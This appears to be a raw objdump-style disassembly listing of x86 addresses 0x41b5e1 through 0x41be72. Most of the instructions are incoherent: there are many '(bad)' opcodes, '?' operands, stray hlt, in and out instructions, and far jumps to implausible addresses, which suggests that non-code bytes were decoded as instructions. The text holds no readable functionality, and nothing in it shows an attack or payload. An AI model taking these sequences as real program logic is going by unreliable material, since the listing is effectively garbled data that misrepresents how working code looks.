  41b5e1:	mov    ebp,0x8
	...
  41b5f6:	add    BYTE PTR [eax],al
  41b5f8:	mov    WORD PTR [ebp-0x4231fff8],?
  41b5fe:	or     DWORD PTR [eax],ecx
  41b600:	mov    ?,WORD PTR [ebp-0x4271fff8]
  41b606:	or     BYTE PTR [eax],al
  41b608:	dec    esi
  41b609:	mov    ebp,0xbd8c0809
  41b60e:	or     BYTE PTR [eax],cl
  41b610:	mov    WORD PTR [ebp-0x42b1fff7],?
  41b616:	or     DWORD PTR [eax],eax
  41b618:	mov    WORD PTR [ebp-0x4271fff8],?
  41b61e:	or     BYTE PTR [eax],al
  41b620:	dec    esp
  41b621:	mov    ebp,0xbd8e0808
  41b626:	or     DWORD PTR [eax],eax
  41b628:	dec    esi
  41b629:	xchg   esp,eax
  41b62a:	fild   WORD PTR [edx]
  41b62c:	test   BYTE PTR [edi+ebx*8+0x2],dl
  41b630:	mov    WORD PTR [esi+0x548c03df],ss
  41b636:	fild   WORD PTR [ebx]
  41b638:	xchg   esp,eax
  41b639:	push   esi
  41b63a:	fild   WORD PTR [edx]
  41b63c:	test   BYTE PTR [esi+0x548402df],dl
  41b642:	fild   WORD PTR [edx]
  41b644:	mov    WORD PTR [edi+ebx*8-0x206973fd],ss
  41b64b:	add    eax,DWORD PTR [esi+edx*2+0x568402df]
  41b652:	fild   WORD PTR [edx]
  41b654:	xchg   esp,eax
  41b655:	xchg   esp,eax
  41b656:	fild   WORD PTR [ebx]
  41b658:	mov    WORD PTR [esi-0x21],ss
  41b65b:	add    al,BYTE PTR [eax]
	...
  41b66d:	add    BYTE PTR [eax],al
  41b66f:	add    BYTE PTR [esi+edx*2-0x697bfc21],al
  41b676:	fild   WORD PTR [ebx]
  41b678:	mov    WORD PTR [edi+ebx*8-0x20ab6bfd],ss
  41b67f:	add    ecx,DWORD PTR [esi+edx*2-0x6b7bfd21]
  41b686:	fild   WORD PTR [edx]
  41b688:	mov    WORD PTR [esi+0x548c02df],ss
  41b68e:	fild   WORD PTR [ebx]
  41b690:	test   BYTE PTR [edi+ebx*8-0x206b73fd],dl
  41b697:	add    edx,DWORD PTR [esp+edx*2-0x696bfd21]
  41b69e:	fild   WORD PTR [edx]
  41b6a0:	mov    WORD PTR [edi+ebp*8+0x3],ss
  41b6a4:	mov    WORD PTR [edi+ebx*8+0x3],?
  41b6a8:	dec    esp
  41b6a9:	je     0x41b68a
  41b6ab:	ret    
  41b6ac:	jecxz  0x41b660
  41b6ae:	into   
  41b6af:	ret    
  41b6b0:	fwait
  41b6b1:	je     0x41b692
  41b6b3:	add    ecx,DWORD PTR [esp+esi*2+0x8]
  41b6b7:	(bad)  [edi-0x3026f76c]
  41b6bd:	jb     0x41b6e7
  41b6bf:	jmp    0xe94a0b53
  41b6c4:	iret   
  41b6c5:	mov    dl,0x14
  41b6c7:	stc    
  41b6c8:	iret   
  41b6c9:	jb     0x41b6d3
  41b6cb:	jmp    0xd94a0b5f
  41b6d0:	(bad)  
  41b6d1:	xchg   esp,eax
  41b6d2:	sub    cl,bl
	...
  41b6e8:	(bad)  
  41b6e9:	push   esp
  41b6ea:	or     cl,ch
  41b6ec:	dec    edi
  41b6ed:	mov    dl,0x14
  41b6ef:	jmp    0xf96a4b83
  41b6f4:	dec    edi
  41b6f5:	mov    dl,0xf4
  41b6f7:	jmp    0xf94a4b8b
  41b6fc:	(bad)  
  41b6fd:	push   esp
  41b6fe:	or     cl,bh
  41b700:	dec    edi
  41b701:	mov    dl,0x14
  41b703:	jmp    0xea366957
  41b708:	dec    edi
  41b709:	jb     0x41b713
  41b70b:	(bad)  [edi-0x4e]
  41b70e:	adc    al,0xd9
  41b710:	(bad)  
  41b711:	xchg   esp,eax
  41b712:	or     cl,bh
  41b714:	(bad)  
  41b715:	push   esp
  41b716:	sub    cl,bh
  41b718:	(bad)  
  41b719:	push   esp
  41b71a:	sub    cl,ch
  41b71c:	(bad)  
  41b71d:	xchg   esp,eax
  41b71e:	or     cl,bh
  41b720:	dec    edi
  41b721:	jb     0x41b72b
  41b723:	jmp    0xd96a2977
  41b728:	dec    edi
  41b729:	mov    dl,0xf4
  41b72b:	jmp    0xe94a28ff
  41b730:	iret   
  41b731:	jno    0x41b75b
  41b733:	jmp    0xe96a4bc7
  41b738:	iret   
  41b739:	mov    cl,0x14
  41b73b:	stc    
  41b73c:	(bad)  
  41b73d:	xchg   esp,eax
  41b73e:	or     cl,bh
  41b740:	(bad)  
  41b741:	push   esp
  41b742:	sub    BYTE PTR [eax],al
  41b744:	in     eax,0xd5
  41b746:	xor    al,0x0
  41b748:	mov    ch,0xd5
  41b74a:	xor    al,0x20
	...
  41b760:	mov    ch,0x95
  41b762:	dec    eax
  41b763:	add    ch,ah
  41b765:	aad    0xf4
  41b767:	push   DWORD PTR [ebp-0x5adff76b]
  41b76d:	xchg   ebp,eax
  41b76e:	dec    eax
  41b76f:	add    BYTE PTR [ebp-0x4ae00b2b],dh
  41b775:	xchg   ebp,eax
  41b776:	or     BYTE PTR [eax],ah
  41b778:	mov    ch,0xd5
  41b77a:	hlt    
  41b77b:	push   DWORD PTR [ebp+0x65200895]
  41b781:	aad    0x34
  41b783:	and    BYTE PTR [ebp-0x2b],dh
  41b786:	xor    al,0x0
  41b788:	gs xchg ebp,eax
  41b78a:	dec    eax
  41b78b:	and    BYTE PTR [ebp-0x2b],dh
  41b78e:	xor    al,0x0
  41b790:	jne    0x41b767
  41b792:	xor    al,0x20
  41b794:	jne    0x41b72b
  41b796:	or     BYTE PTR [eax],al
  41b798:	xor    eax,0x35204895
  41b79d:	xchg   ebp,eax
  41b79e:	or     BYTE PTR [eax],al
  41b7a0:	xor    eax,0x35fff4d5
  41b7a5:	xchg   ebp,eax
  41b7a6:	dec    eax
  41b7a7:	and    BYTE PTR ds:0x250034d5,dh
  41b7ad:	aad    0xf4
  41b7af:	jmp    DWORD PTR ds:0x25004895
  41b7b5:	aad    0xf4
  41b7b7:	pop    ds
  41b7b8:	and    eax,0x25000895
  41b7bd:	aad    0x34
  41b7bf:	and    ch,dh
  41b7c1:	xchg   esp,eax
  41b7c2:	or     BYTE PTR [eax],ah
	...
  41b7d8:	in     eax,0x94
  41b7da:	dec    eax
  41b7db:	add    ch,dh
  41b7dd:	aam    0xf4
  41b7df:	pop    ds
  41b7e0:	in     eax,0x94
  41b7e2:	sub    BYTE PTR [eax],al
  41b7e4:	mov    WORD PTR [ebp-0x4277dff8],?
  41b7ea:	lock dec DWORD PTR [edi-0x73fff745]
  41b7f1:	mov    ebx,0xbccbfff0
  41b7f6:	lock dec DWORD PTR [edi-0x73e00f43]
  41b7fd:	mov    ebx,0xbd881ff0
  41b802:	lock pop ds
  41b804:	nop
  41b805:	mov    ebx,0xbb8c2008
  41b80a:	or     BYTE PTR [eax],al
  41b80c:	mov    WORD PTR [ebp-0x4277fff8],?
  41b812:	or     BYTE PTR [eax],al
  41b814:	mov    WORD PTR [ebp-0x4477fff8],?
  41b81a:	or     BYTE PTR [eax],ah
  41b81c:	nop
  41b81d:	mov    ebx,0xbe73fff0
  41b822:	lock dec DWORD PTR [edi-0x73e00f45]
  41b829:	mov    ebx,0xbd8c2008
  41b82e:	lock dec DWORD PTR [edi-0x6ffff745]
  41b835:	mov    ebp,0xbd882008
  41b83a:	lock pop ds
	...
  41b850:	nop
  41b851:	mov    ebx,0xbd8c2008
  41b856:	or     BYTE PTR [eax],ah
  41b858:	nop
  41b859:	mov    ebp,0xbc23fff0
  41b85e:	lock call FWORD PTR [ebx]
  41b861:	mov    esp,0xbd881ff0
  41b866:	lock pop ds
  41b868:	mov    WORD PTR [ebx-0x4273fff8],?
  41b86e:	or     BYTE PTR [eax],al
  41b870:	nop
  41b871:	xchg   esp,eax
  41b872:	(bad)  
  41b874:	xchg   ebx,eax
  41b875:	xchg   esp,eax
  41b876:	fild   WORD PTR [ebx]
  41b878:	mov    WORD PTR [eax-0x6b7c0421],ds
  41b87e:	fild   WORD PTR [ebx]
  41b880:	lods   al,BYTE PTR ds:[esi]
  41b881:	xchg   esp,eax
  41b882:	loope  0x41b87f
  41b884:	rcl    DWORD PTR [ebx-0x6c34041f],cl
  41b88a:	loope  0x41b88f
  41b88c:	ins    BYTE PTR es:[edi],dx
  41b88d:	cwde   
  41b88e:	loope  0x41b893
  41b890:	ins    BYTE PTR es:[edi],dx
  41b891:	cwde   
  41b892:	loope  0x41b897
  41b894:	mov    WORD PTR [ecx+eiz*8-0x206b93fd],ss
  41b89b:	add    ecx,DWORD PTR [eax+ebx*4-0x6c640421]
  41b8a2:	fild   WORD PTR [ebx]
  41b8a4:	ins    BYTE PTR es:[edi],dx
  41b8a5:	xchg   esp,eax
  41b8a6:	(bad)  
  41b8a8:	stos   DWORD PTR es:[edi],eax
  41b8a9:	cwde   
  41b8aa:	loope  0x41b8a7
  41b8ac:	sub    DWORD PTR [edi-0x6b640420],0xffffffdf
  41b8b3:	sti    
	...
  41b8c8:	xchg   ebx,eax
  41b8c9:	cwde   
  41b8ca:	loope  0x41b8c7
  41b8cc:	imul   ebp,DWORD PTR [edi-0x6773fc20],0xffffffe1
  41b8d3:	sti    
  41b8d4:	jnp    0x41b86e
  41b8d6:	fild   WORD PTR [ebx]
  41b8d8:	lods   al,BYTE PTR ds:[esi]
  41b8d9:	cwde   
  41b8da:	(bad)  
  41b8dc:	stos   DWORD PTR es:[edi],eax
  41b8dd:	xchg   esp,eax
  41b8de:	fild   WORD PTR [ebx]
  41b8e0:	mov    WORD PTR [ecx+eiz*8-0x1e6b73fd],ss
  41b8e7:	sti    
  41b8e8:	xchg   ebx,eax
  41b8e9:	cwde   
  41b8ea:	fild   WORD PTR [ebx]
  41b8ec:	mov    WORD PTR [ecx+eiz*8-0x206b7c05],ss
  41b8f3:	add    ebp,DWORD PTR [eax+ebx*4-0x21]
  41b8f7:	sti    
  41b8f8:	adc    ebp,DWORD PTR [edi-0x6773fc20]
  41b8fe:	or     cl,ch
  41b900:	pop    es
  41b901:	scas   eax,DWORD PTR es:[edi]
  41b902:	or     cl,ch
  41b904:	imul   DWORD PTR [esi+0x748febf4]
  41b90a:	or     BYTE PTR [ecx-0x16fb5121],ch
  41b910:	fild   QWORD PTR [esi-0x6770160c]
  41b916:	or     BYTE PTR [ecx-0x16e76d21],ch
  41b91c:	(bad)  
  41b91d:	xchg   esp,eax
  41b91e:	sbb    BYTE PTR [ecx-0x56fb5141],ch
  41b924:	(bad)  
  41b925:	xchg   esp,eax
  41b926:	or     cl,ch
  41b928:	(bad)  
  41b929:	xchg   esp,eax
  41b92a:	sbb    BYTE PTR [ecx],ch
	...
  41b940:	nop
  41b941:	cwde   
  41b942:	or     cl,ch
  41b944:	(bad)  
  41b945:	cwde   
  41b946:	sbb    BYTE PTR [ecx],ch
  41b948:	mov    al,ds:0x9fe91892
  41b94d:	xchg   edx,eax
  41b94e:	or     cl,ch
  41b950:	jg     0x41b8e4
  41b952:	sbb    BYTE PTR [ecx],ch
  41b954:	js     0x41b8e8
  41b956:	or     cl,ch
  41b958:	jg     0x41b908
  41b95a:	hlt    
  41b95b:	sub    DWORD PTR [eax-0x7016f76c],ecx
  41b961:	cwde   
  41b962:	sbb    BYTE PTR [ecx],ch
  41b964:	mov    BYTE PTR [eax+ebx*1+0x4ae5fe9],dl
  41b96b:	sub    DWORD PTR [eax-0x52],ebx
  41b96e:	hlt    
  41b96f:	jmp    0x294a4bb3
  41b974:	mov    BYTE PTR [eax-0x676fd6f8],bl
  41b97a:	sbb    cl,ch
  41b97c:	aas    
  41b97d:	xchg   edx,eax
  41b97e:	sbb    BYTE PTR [ecx-0x160b51e1],ch
  41b984:	(bad)  
  41b985:	xchg   esp,eax
  41b986:	or     cl,ch
  41b988:	(bad)  
  41b989:	xchg   esp,eax
  41b98a:	or     BYTE PTR [eax],al
  41b98c:	in     eax,0x91
  41b98e:	or     al,0x10
  41b990:	xor    eax,0xf5100892
  41b995:	mov    eax,ds:0xa2250ff4
  41b99a:	or     BYTE PTR [eax],al
  41b99c:	in     eax,0x91
  41b99e:	or     al,0x0
  41b9a0:	xor    eax,0x8a2
	...
  41b9b5:	add    BYTE PTR [eax],al
  41b9b7:	add    ch,dh
  41b9b9:	xchg   ecx,eax
  41b9ba:	or     al,0x0
  41b9bc:	in     eax,0xa1
  41b9be:	or     BYTE PTR [eax],dl
  41b9c0:	in     eax,0xa1
  41b9c2:	hlt    
  41b9c3:	push   ebp
  41b9c5:	xchg   ecx,eax
  41b9c6:	or     BYTE PTR [eax],al
  41b9c8:	cmc    
  41b9c9:	xchg   ecx,eax
  41b9ca:	or     al,0x10
  41b9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9cd:	mov    eax,ds:0xa865fff4
  41b9d2:	or     BYTE PTR [eax],al
  41b9d4:	mov    ch,0xa1
  41b9d6:	hlt    
  41b9d7:	pcmpeqw mm3,QWORD PTR [eax-0x679afff8]
  41b9de:	or     BYTE PTR [eax],dl
  41b9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9e1:	xchg   ecx,eax
  41b9e2:	or     al,0x10
  41b9e4:	mov    ch,0x98
  41b9e6:	or     al,0x10
  41b9e8:	jne    0x41b97b
  41b9ea:	or     BYTE PTR [eax],dl
  41b9ec:	gs xchg ecx,eax
  41b9ee:	or     al,0x0
  41b9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9f1:	test   al,0xf4
  41b9f3:	pcmpeqw mm2,QWORD PTR [ecx-0x574afff8]
  41b9fa:	or     BYTE PTR [eax],dl
  41b9fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9fd:	cwde   
  41b9fe:	or     al,0x0
  41ba00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba01:	cwde   
  41ba02:	or     BYTE PTR [eax],dl
  41ba04:	xor    eax,0x35100c91
  41ba09:	mov    eax,ds:0xa8650ff4
  41ba0e:	hlt    
  41ba0f:	(bad)  
  41ba11:	xchg   ecx,eax
  41ba12:	or     BYTE PTR [eax],al
  41ba14:	cmc    
  41ba15:	mov    al,ds:0xbb8c1008
  41ba1a:	clc    
  41ba1b:	add    eax,DWORD PTR [eax]
	...
  41ba2d:	add    BYTE PTR [eax],al
  41ba2f:	add    BYTE PTR [ebx+edi*4-0x473fc08],cl
  41ba36:	clc    
  41ba37:	dec    DWORD PTR [ebx]
  41ba39:	sti    
  41ba3a:	clc    
  41ba3b:	inc    DWORD PTR [ebx]
  41ba3d:	sti    
  41ba3e:	or     BYTE PTR [esp+ecx*4],al
  41ba41:	mov    ebx,0xbb9c0008
  41ba46:	clc    
  41ba47:	add    edi,DWORD PTR [edi+esi*2-0x32]
  41ba4b:	(bad)  
  41ba4c:	jecxz  0x41ba08
  41ba4e:	or     BYTE PTR [eax],al
  41ba50:	mov    WORD PTR [ebx+0x178c0008],?
  41ba56:	jae    0x41ba57
  41ba58:	retf   
  41ba59:	push   es
  41ba5a:	mov    edi,?
  41ba5c:	ret    
  41ba5d:	inc    edx
  41ba5e:	mov    edi,edi
  41ba60:	mov    ebx,0x8c0008ba
  41ba65:	mov    ebx,0xcd8c0008
  41ba6a:	jne    0x41ba6b
  41ba6c:	mov    ds:0x9bff8a92,eax
  41ba71:	push   es
  41ba72:	mov    edi,?
  41ba74:	xchg   ebx,eax
  41ba75:	mov    edx,0xbd8c0008
  41ba7a:	or     BYTE PTR [eax],al
  41ba7c:	mov    ecx,cs
  41ba7e:	jae    0x41ba7f
  41ba80:	jnp    0x41baf4
  41ba82:	mov    bh,bh
  41ba84:	jae    0x41bab8
  41ba86:	mov    edi,?
  41ba88:	imul   edi,DWORD PTR [esi-0x4273fff8],0x8
  41ba8f:	add    BYTE PTR [ebp+eiz*8+0xff72],cl
	...
  41baa6:	add    BYTE PTR [eax],al
  41baa8:	push   ebx
  41baa9:	bound  ecx,QWORD PTR [edx-0x73e5b401]
  41baaf:	inc    DWORD PTR [ebx-0x42]
  41bab2:	or     BYTE PTR [eax],al
  41bab4:	mov    WORD PTR [ebp-0x6b73fff8],?
  41baba:	push   ebp
  41babb:	jge    0x41bae8
  41babd:	lods   al,BYTE PTR ds:[esi]
  41babe:	rol    BYTE PTR [ecx-0x7bad53dd],cl
  41bac4:	sbb    ebp,DWORD PTR [esi+ebx*8-0x206b73fd]
  41bacb:	add    ecx,DWORD PTR [esp+edx*4-0x53fc83fd]
  41bad2:	bound  eax,QWORD PTR [edx-0x7d215405]
  41bad8:	rep stos DWORD PTR es:[edi],eax
  41bada:	fiadd  WORD PTR [ebx]
  41badc:	mov    WORD PTR [edi+ebx*8-0x626b73fd],ss
  41bae3:	jnp    0x41bac0
  41bae5:	stos   DWORD PTR es:[edi],eax
  41bae6:	outs   dx,BYTE PTR ds:[esi]
  41bae7:	adc    bl,0xab
  41baea:	jmp    0x8c03:0xdeabcb82
  41baf1:	xchg   esp,eax
  41baf2:	fild   WORD PTR [ebx]
  41baf4:	mov    WORD PTR [ebp+eiz*8-0x65544c85],ss
  41bafb:	sub    DWORD PTR [ebx-0x5c7cc955],0x8c03deab
  41bb05:	xchg   esp,eax
  41bb06:	fild   WORD PTR [ebx]
  41bb08:	mov    WORD PTR [ecx+esi*8+0x7a],ss
	...
  41bb1f:	add    BYTE PTR [ebx-0x7c7e5955],cl
  41bb25:	stos   DWORD PTR es:[edi],eax
  41bb26:	fiadd  WORD PTR [ebx]
  41bb28:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41bb2f:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  41bb36:	fild   WORD PTR [ebx]
  41bb38:	mov    WORD PTR [ebx+ecx*4+0x70ab5381],ss
  41bb3f:	or     DWORD PTR [ebx-0x55],0xab438174
  41bb46:	pop    es
  41bb47:	in     eax,0xc
  41bb49:	stos   DWORD PTR es:[edi],eax
  41bb4a:	hlt    
  41bb4b:	ror    DWORD PTR [ebx+ebp*4],1
  41bb4e:	hlt    
  41bb4f:	or     eax,0x1bf4ab0d
  41bb54:	or     eax,0xcabf4ab
  41bb59:	stos   DWORD PTR es:[edi],eax
  41bb5a:	hlt    
  41bb5b:	lahf   
  41bb5c:	or     al,0xab
  41bb5e:	hlt    
  41bb5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb60:	or     al,0xab
  41bb62:	hlt    
  41bb63:	ror    DWORD PTR [ebx+ebp*4],1
  41bb66:	hlt    
  41bb67:	mov    ebp,0x63f4ab0c
  41bb6c:	or     al,0xab
  41bb6e:	hlt    
  41bb6f:	dec    edi
  41bb70:	or     al,0xab
  41bb72:	hlt    
  41bb73:	push   ebp
  41bb74:	or     al,0xab
  41bb76:	hlt    
  41bb77:	and    ecx,DWORD PTR [ebx+ebp*4]
  41bb7a:	hlt    
  41bb7b:	xor    ecx,DWORD PTR [ebx+ebp*4]
  41bb7e:	hlt    
  41bb7f:	adc    eax,0xfdf4ab0c
	...
  41bb98:	inc    ebx
  41bb99:	stos   DWORD PTR es:[edi],eax
  41bb9a:	hlt    
  41bb9b:	out    0x3b,eax
  41bb9d:	stos   DWORD PTR es:[edi],eax
  41bb9e:	hlt    
  41bb9f:	iret   
  41bba0:	xor    ebp,DWORD PTR [ebx-0x54ebe40c]
  41bba6:	hlt    
  41bba7:	sub    DWORD PTR [ebx+ebp*4],edx
  41bbaa:	hlt    
  41bbab:	cmp    eax,0x43f4ab04
  41bbb0:	add    al,0xab
  41bbb2:	hlt    
  41bbb3:	inc    ebx
  41bbb4:	adc    al,0xaa
  41bbb6:	hlt    
  41bbb7:	addr16 adc al,0xaa
  41bbba:	hlt    
  41bbbb:	mov    eax,DWORD PTR [edx+ebp*4]
  41bbbe:	hlt    
  41bbbf:	jne    0x41bbc5
  41bbc1:	stos   BYTE PTR es:[edi],al
  41bbc2:	hlt    
  41bbc3:	stos   DWORD PTR es:[edi],eax
  41bbc4:	adc    al,0xaa
  41bbc6:	hlt    
  41bbc7:	mov    ebx,0x8df4aa14
  41bbcc:	add    al,0xaa
  41bbce:	hlt    
  41bbcf:	cdq    
  41bbd0:	add    al,0xaa
  41bbd2:	hlt    
  41bbd3:	add    BYTE PTR ds:0x31fff51d,dh
  41bbd9:	sbb    eax,0x1d45fff5
  41bbde:	cmc    
  41bbdf:	push   ebp
  41bbe1:	sbb    al,0xf5
  41bbe3:	push   edi
  41bbe5:	sbb    al,0xf5
  41bbe7:	jmp    edi
  41bbe9:	sbb    al,0xf5
  41bbeb:	dec    DWORD PTR [edi+0x1d]
  41bbee:	cmc    
  41bbef:	jmp    FWORD PTR [ebx+0x73fff51b]
  41bbf5:	sbb    esi,ebp
  41bbf7:	push   DWORD PTR [ebp+0xfff51b]
	...
  41bc0d:	add    BYTE PTR [eax],al
  41bc0f:	add    BYTE PTR [ebp-0x4a000ae5],bl
  41bc15:	sbb    esi,ebp
  41bc17:	push   DWORD PTR [ecx-0x18000ae5]
  41bc1d:	sbb    esi,ebp
  41bc1f:	inc    edi
  41bc21:	sbb    esi,ebp
  41bc23:	dec    edi
  41bc25:	sbb    esi,ebp
  41bc27:	push   ebp
  41bc29:	sbb    esi,ebp
  41bc2b:	jmp    DWORD PTR ds:0x23fff51c
  41bc31:	sbb    al,0xf5
  41bc33:	jmp    DWORD PTR [ebp+0x1f000895]
  41bc39:	sbb    esi,ebp
  41bc3b:	call   DWORD PTR [edi]
  41bc3d:	sbb    al,0xf5
  41bc3f:	(bad)  
  41bc40:	call   FWORD PTR [ebx]
  41bc42:	cmc    
  41bc43:	(bad)  
  41bc44:	out    dx,eax
  41bc45:	sbb    esi,ebp
  41bc47:	jmp    FWORD PTR [edi]
  41bc49:	sbb    esi,ebp
  41bc4b:	call   DWORD PTR [ebx+0x1b]
  41bc4e:	cmc    
  41bc4f:	jmp    DWORD PTR [ebp-0x6b]
  41bc52:	or     BYTE PTR [eax],al
  41bc54:	ins    DWORD PTR es:[edi],dx
  41bc55:	push   ds
  41bc56:	cmc    
  41bc57:	push   DWORD PTR [ebp-0x6b]
  41bc5a:	or     BYTE PTR [eax],al
  41bc5c:	push   ebp
  41bc5d:	push   ds
  41bc5e:	cmc    
  41bc5f:	dec    DWORD PTR [ebx+ecx*8+0x6f53ff81]
  41bc66:	cmp    edi,0xff818d4b
  41bc6c:	inc    ebx
  41bc6d:	fwait
  41bc6e:	cmp    edi,0xff81ab3b
	...
  41bc88:	xor    edi,DWORD PTR [ebx]
  41bc8a:	cmp    bh,0x2b
  41bc8d:	sub    eax,0x1d23ff82
  41bc92:	cmp    bh,0x1b
  41bc95:	add    eax,DWORD PTR [edx-0x7d8cec01]
  41bc9b:	dec    DWORD PTR [ebx]
  41bc9d:	mov    ebx,0x518c0008
  41bca2:	cmp    bh,0xfb
  41bca5:	mov    edx,0xbd8c0008
  41bcaa:	cmp    bh,0xeb
  41bcad:	test   al,0x80
  41bcaf:	jmp    ebx
  41bcb1:	mov    edx,0xc38c0008
  41bcb6:	cmp    bh,0xd3
  41bcb9:	out    dx,al
  41bcba:	cmp    bh,0xcb
  41bcbd:	or     al,BYTE PTR [ecx-0x7ef93c01]
  41bcc3:	(bad)  
  41bcc4:	mov    ebx,0xb3ff8118
  41bcc9:	sub    al,0x81
  41bccb:	jmp    FWORD PTR [ebx-0x73fff746]
  41bcd1:	and    eax,0x289bff84
  41bcd6:	test   bh,bh
  41bcd8:	xchg   ebx,eax
  41bcd9:	adc    BYTE PTR [edi+edi*8-0x7bd175],al
  41bce0:	adc    DWORD PTR [esp+eax*4],0xffffffff
  41bce4:	jnp    0x41bcdc
  41bce6:	cmp    edi,0x73
  41bce9:	push   cs
  41bcea:	test   bh,bh
	...
  41bd00:	imul   edx,DWORD PTR [ebp-0x579c7337],0xffffff80
  41bd07:	mov    WORD PTR [ebx-0x58],ds
  41bd0a:	mov    cs,WORD PTR [ebx+edx*2-0x73fc2158]
  41bd11:	xchg   esp,eax
  41bd12:	stc    
  41bd13:	mov    al,BYTE PTR [ebx-0x58]
  41bd16:	aam    0x8a
  41bd18:	cmp    ebp,DWORD PTR [eax-0x6b73fc22]
  41bd1e:	mov    eax,DWORD PTR [esi-0x79af57d5]
  41bd24:	and    ebp,DWORD PTR [eax-0x57e479ac]
  41bd2a:	jmp    0xb84:0xf6a81384
  41bd31:	test   al,0x2
  41bd33:	test   DWORD PTR [ebx],eax
  41bd35:	test   al,0xf0
  41bd37:	test   bl,bh
  41bd39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3a:	mov    al,ds:0x94a7f384
  41bd3f:	test   bl,ch
  41bd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd42:	retf   0xe384
  41bd45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd46:	xchg   esi,eax
  41bd47:	test   bl,bl
  41bd49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd4a:	xchg   edx,eax
  41bd4b:	test   bl,dl
  41bd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd4e:	push   0x44a7cb85
  41bd53:	test   ebx,eax
  41bd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd56:	cmp    al,BYTE PTR [ebp-0x7ad75845]
  41bd5c:	mov    bl,0xa7
  41bd5e:	sbb    BYTE PTR [ebp-0x7b255855],al
	...
  41bd78:	mov    ds:0x9b84d2a7,eax
  41bd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd7e:	in     al,dx
  41bd7f:	xchg   DWORD PTR [ebx-0x74781b59],edx
  41bd85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd86:	lock xchg DWORD PTR [ebx+0x7b881ea7],eax
  41bd8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd8e:	pop    es
  41bd8f:	sbb    eax,0x43f4a704
  41bd94:	adc    al,0xa7
  41bd96:	hlt    
  41bd97:	and    edx,DWORD PTR [edi+eiz*4]
  41bd9a:	hlt    
  41bd9b:	adc    esp,DWORD PTR [bx+0x4bf4]
  41bda0:	or     esp,DWORD PTR [edi-0x58ecaa0c]
  41bda6:	hlt    
  41bda7:	stos   DWORD PTR es:[edi],eax
  41bda8:	or     esp,DWORD PTR [edi-0x58ec640c]
  41bdae:	hlt    
  41bdaf:	lea    ecx,[ebx]
  41bdb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdb2:	hlt    
  41bdb3:	jns    0x41bdc8
  41bdb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdb6:	hlt    
  41bdb7:	jmp    0xee3664c6
  41bdbc:	adc    ah,BYTE PTR [edi-0x58f4f60c]
  41bdc2:	hlt    
  41bdc3:	sbb    DWORD PTR [ebx],edx
  41bdc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdc6:	hlt    
  41bdc7:	stos   DWORD PTR es:[edi],eax
  41bdc8:	or     ah,BYTE PTR [edi-0x58ed640c]
  41bdce:	hlt    
  41bdcf:	ret    
  41bdd0:	or     ah,BYTE PTR [edi-0x58ed980c]
  41bdd6:	hlt    
  41bdd7:	xchg   DWORD PTR [edx],ecx
  41bdd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdda:	hlt    
  41bddb:	sub    DWORD PTR [eax],eax
	...
  41bded:	add    BYTE PTR [eax],al
  41bdef:	add    BYTE PTR [edx],dl
  41bdf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdf2:	hlt    
  41bdf3:	xor    DWORD PTR [edx],ecx
  41bdf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdf6:	hlt    
  41bdf7:	sbb    DWORD PTR [edx],edx
  41bdf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdfa:	hlt    
  41bdfb:	add    eax,0xdbf4a70a
  41be00:	add    eax,0x5cbf4a7
  41be05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be06:	hlt    
  41be07:	ret    
  41be08:	adc    eax,0xa29f4a7
  41be0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be0e:	hlt    
  41be0f:	cmp    DWORD PTR [edx],edx
  41be11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be12:	hlt    
  41be13:	aaa    
  41be14:	or     ah,BYTE PTR [edi-0x6b70160c]
  41be1a:	or     BYTE PTR [eax],al
  41be1c:	dec    DWORD PTR [esi]
  41be1e:	cmc    
  41be1f:	inc    DWORD PTR [edi]
  41be21:	pmaddwd mm7,mm7
  41be24:	dec    DWORD PTR [esi]
  41be26:	cmc    
  41be27:	jmp    FWORD PTR [edi]
  41be29:	pmaddwd mm7,mm7
  41be2c:	dec    edi
  41be2d:	pmaddwd mm7,mm7
  41be30:	or     ecx,DWORD PTR [edi]
  41be32:	cmc    
  41be33:	jmp    DWORD PTR [ebp-0x6e]
  41be36:	or     BYTE PTR [eax],al
  41be38:	sub    eax,0x35fff50f
  41be3d:	xchg   edx,eax
  41be3e:	or     BYTE PTR [eax],al
  41be40:	inc    ebp
  41be41:	pmaddwd mm7,mm7
  41be44:	cmc    
  41be45:	push   cs
  41be46:	cmc    
  41be47:	push   DWORD PTR [ecx+0xd]
  41be4a:	cmc    
  41be4b:	jmp    edi
  41be4d:	push   cs
  41be4e:	cmc    
  41be4f:	inc    DWORD PTR [ebp+0xf]
  41be52:	cmc    
  41be53:	inc    DWORD PTR [eax]
	...
  41be65:	add    BYTE PTR [eax],al
  41be67:	add    BYTE PTR ds:0x75fff50f,dh
  41be6d:	or     eax,0xd67fff5
  41be72:	cmc    
